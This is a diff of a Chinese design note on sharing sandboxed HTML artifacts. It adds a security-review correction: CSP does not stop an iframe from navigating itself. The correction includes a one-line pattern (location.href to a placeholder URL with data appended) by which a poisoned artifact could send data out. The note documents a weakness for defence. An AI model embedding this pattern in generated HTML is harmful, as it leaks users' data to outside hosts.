@@ -136,7 +136,15 @@ lineage 層(第 5 題)。
 - **`Shared to me` 維持扁平**——別人的 session 存取一律 404,分享來的 Artifact 本來
   就是一份獨立成品,沒有歷史可看。全頁檢視的程式碼已經這樣分岔(`isOwn === false`
   時不渲染版本選單,改顯示分享者與「Shared to me」標記)。
-- **Artifact 是資料烤死的成品,不是版型**。CSP `connect-src 'none'` 讓 iframe 內的
-  script 完全無法發出請求;資料在後端組裝時就注入 HTML。所以分享 = 分享那批資料的
-  快照,權限判斷只在「能不能拿到這份 HTML」那一層。這點我們已理解並接受,列在這裡
-  是為了確認雙方認知一致。
+- **Artifact 是資料烤死的成品,不是版型**。資料在後端組裝時就注入 HTML,iframe 內的
+  script 無法重新查詢。所以分享 = 分享那批資料的**快照**,權限判斷只在「能不能拿到
+  這份 HTML」那一層。這點我們已理解並接受,列在這裡是為了確認雙方認知一致。
+
+  **更正(2026-08-29 安全審查)**:先前這裡寫「CSP `connect-src 'none'` 讓 script
+  完全無法發出請求」是過度宣稱。`connect-src` 擋 fetch/XHR/WebSocket,但**擋不住
+  iframe 導覽自己**(`location.href = 'https://…?' + data`)——sandbox 缺
+  `allow-top-navigation` 只擋頂層導覽,CSP 也沒有能擋這件事的指令。也就是說,一份
+  惡意或被污染的 artifact **仍有外送資料的路徑**。這不改變「分享=快照」的結論,但
+  改變了它的安全邊界:我們無法在前端保證 artifact 不外洩它收到的資料。**若這對
+  fab 資料是不可接受的,需要後端在組裝時消毒 agent 產出的 HTML** — 這一項待雙方
+  決策,見安全審查紀錄。
